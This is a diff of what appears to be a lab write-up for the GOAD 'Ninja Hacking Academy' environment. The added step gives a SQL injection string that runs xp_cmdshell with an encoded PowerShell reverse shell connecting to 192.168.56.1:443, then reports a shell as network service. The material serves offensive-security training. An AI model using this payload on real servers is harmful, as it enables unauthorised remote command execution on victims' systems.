@@ -1,4 +1,4 @@
-<img width="1925" height="945" alt="image" src="https://github.com/user-attachments/assets/45e65ace-a0ac-4d0a-a782-0bcb1b27271b" />layout: default
+---
 title : nighthawk - GOAD - NHA Ninja Hacking Academy (NHA)
 ---
 
@@ -151,6 +151,20 @@ this confirmed we can execute commands and also interact with our attacker machi
 <img width="640" height="180" alt="image" src="https://github.com/user-attachments/assets/2548d04a-34b0-44f6-b947-44eeb08b0460" />
 
 Our listener didn't catch shell. maybe there's a defense. 
+
+- Let's look for another way 😹
+
+```
+;EXEC%20xp_cmdshell%20%27powershell%20-nop%20-w%20hidden%20-enc%20JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAnACwANAA0ADMAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAtAG4AZQAgADAAKQB7ADsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJAByAD0AaQBlAHgAIAAkAGQAIAAyAD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwA7ACQAcgA9ACQAcgArACcAUABTAD4AIAAnADsAJABzAGIAYgA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJAByACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgBiACwAMAAsACQAcwBiAGIALgBMAGUAbgBnAHQAaAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA%3D%3D%27%3B--
+```
+
+<img width="3456" height="516" alt="image" src="https://github.com/user-attachments/assets/fadab247-5e6b-4cec-a755-4b69840bcaf0" />
+
+Boom we got reverse shell as `nt authority\network service`
+
+
+#### Privilege Escalation 
+
 
 
 
